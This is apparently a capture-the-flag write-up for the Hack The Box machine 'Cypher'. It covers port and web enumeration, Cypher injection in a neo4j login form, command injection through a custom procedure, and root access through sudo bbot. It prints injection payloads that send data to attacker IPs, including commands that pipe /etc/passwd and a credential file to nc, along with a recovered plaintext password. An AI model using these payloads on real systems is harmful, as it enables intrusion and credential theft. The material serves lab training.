# Cypher - medium

## Enumeration

```
sudo nmap 10.10.11.57 -p-          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 09:19 EDT
Nmap scan report for 10.10.11.57
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.11 seconds
```

```
sudo nmap 10.10.11.57 -p 22,80 -sC -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 10:50 EDT
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

### File Enumeration

```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt  -u http://cypher.htb/FUZZ -mc all -fc 404  
...
index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 31ms]
login.html              [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 29ms]
.                       [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 32ms]
about.html              [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 37ms]
logo.png                [Status: 200, Size: 206674, Words: 651, Lines: 876, Duration: 28ms]
:: Progress: [37050/37050] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

### Directories Enumeration
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cypher.htb/FUZZ -mc all -fc 404
...
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 31ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 32ms]
#                       [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 33ms]
                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 33ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 33ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 27ms]
```


After some tests we find that the `login request` is vulnerable to `cypher command injection`. </br>
Putting a `single quote` in the username generate an error message:
```
{"username":"test'","password":"0"}
```
The application uses `neo4j` and `cypher`, which is a query language. </br>
The error message gives the broken cypher query:
```
neo4j.exceptions.CypherSyntaxError: ...
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'wdf'' return h.value as hash"                                    
```

We can craft malicious queries ands extract informations from the database. </br>

Like finding the keys of the object `USER` and `SHA1` :
```
{"username":"1' OR 1=1 LOAD CSV FROM 'http://10.10.16.104:9999/'+keys(h)[0] AS hash RETURN ''//","password":"0"}


{"username":"1' OR 1=1 LOAD CSV FROM 'http://10.10.16.104:9999/'+keys(u)[0] AS hash RETURN ''//","password":"0"}

Keys
h.value
u.name
```

And find the content:
```
{"username":"1' OR 1=1 LOAD CSV FROM 'http://10.10.16.104:9999/'+h.value AS hash RETURN ''//","password":"0"}


{"username":"1' OR 1=1 LOAD CSV FROM 'http://10.10.16.104:9999/'+u.name AS hash RETURN ''//","password":"0"}

graphasm = u.name
9f54ca4c130be6d529a56dee59dc2b2090e43acf = h.value
```

With these credentials we get a valid `access-token`:
```
{"username":"graphasm' OR 1=1 return 'd033e22ae348aeb5660fc2140aec35850c4da997' as hash //","password":"admin"}
```

On the **demo** page, we have the possibility to make cypher queries, nothing more. </br>
After some researches we found customizable procedures in the `neo4j` database:
```
SHOW PROCEDURES;
```

The first result is a customable procedure named `custom.getUrlStatusCode`
```
 {
    "name": "custom.getUrlStatusCode",
    "description": "Returns the HTTP status code for the given URL as a string",
    "mode": "READ",
    "worksOnSystem": false
  },
```

The procedure takes an URL as argument and return the HTTP status code. This procedure is vulnerable to command injection:
```
CALL custom.getUrlStatusCode('; whoami'); 
```

We will exploit this vulnerabilty to extract files: 
```
CALL custom.getUrlStatusCode('http://10.10.14.16:1234/ ; cat /etc/passwd | base64 | nc 10.10.14.16 9999'); 
```

The password of the user `graphasm` is located in a file in the home directory:
```
CALL custom.getUrlStatusCode('http://10.10.14.16:1234/ ; cat /home/graphasm/bbot_preset.yml | base64 | nc 10.10.14.16 9999'); 
  
echo -n 'dGFyZ2V0czoKICAtIGVjb3JwLmh0YgoKb3V0cHV0X2RpcjogL2hvbWUvZ3JhcGhhc20vYmJvdF9z
Y2FucwoKY29uZmlnOgogIG1vZHVsZXM6CiAgICBuZW80ajoKICAgICAgdXNlcm5hbWU6IG5lbzRq
CiAgICAgIHBhc3N3b3JkOiBjVTRidHlpYi4yMHh0Q01DWGtCbWVyaEsK' | base64 -d       
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

We can connect to the machine with the creds `graphasm:cU4btyib.20xtCMCXkBmerhK`


## Privelge Escalation 

The user have sudo rigths:
```
graphasm@cypher:~/bbot-privesc$ sudo -l 
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

We can execute `bbot` as root. </br>

On github, we find a malicious configuration of bbot wich executes a shell

https://github.com/Housma/bbot-privesc

```
sudo /usr/local/bin/bbot -t dummy.com -p ./preset.yml --event-types ROOT
```